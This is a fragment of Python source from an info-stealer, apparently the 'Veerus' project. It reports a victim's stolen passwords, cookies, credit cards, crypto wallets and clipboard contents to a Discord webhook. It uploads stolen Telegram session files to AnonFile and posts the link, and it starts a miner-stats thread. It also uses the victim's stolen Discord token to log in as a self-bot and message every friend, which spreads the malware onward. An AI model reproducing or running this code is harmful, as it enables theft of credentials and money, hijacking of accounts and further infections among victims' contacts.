		embed2 = DiscordEmbed(title='Stealer', description=f'**:key: Passwords : {PASSWORDNUM}\n:cookie: Cookies : {COOKIESNUM}\n:money_with_wings: CreditCards : {CREDITCARDSNUM}\n:money_with_wings: Currency Cookies : {CURRENCYCOOKIESNUM}\n:money_mouth: Currency Password : {CURRENCYPWNUM}\n:pushpin: Wallet Count : {WALLETCOUNT}\n:clipboard: Clipboard : ```{GetClipboardData()}```**', color='03b2f8')
		webhook.add_embed(embed2)
		try:
			TelegramSessionPath = stealTLG()
			print(TelegramSessionPath)
			anon = AnonFile()
			upload = anon.upload(TelegramSessionPath, progressbar=True)
			SESSIONURL = upload.url.geturl()
			embed3 = DiscordEmbed(title='github.com/0xSxZ/Veerus', description=f':telephone: **0xGot Telegram Sessions !\nDownload link : **{SESSIONURL}', color='7F8C8D')
			webhook.add_embed(embed3)
		except:
			print("No Telegram Sessions")
		webhook.execute()
	print("[.] Sending Stats")
	threading.Thread(target=minerstats).start()
	@mdmbot.event
	async def on_connect():
		for user in mdmbot.user.friends:
			try:
				user = await mdmbot.fetch_user(user.id)
				await user.send(DMALLMSG)
			except Exception as e:
					print(f"Failed to send message to: {user.name} {str(e)}")
		print(f"{mdmbot.user.name} hass finished mdming!")

	if(dm_all == True):
		token = getDisk0rdToken().replace("b'", "\n").replace("'", "").split(" ")[0]
		print("Token : " + token)
		mdmbot.run(token, bot=False)
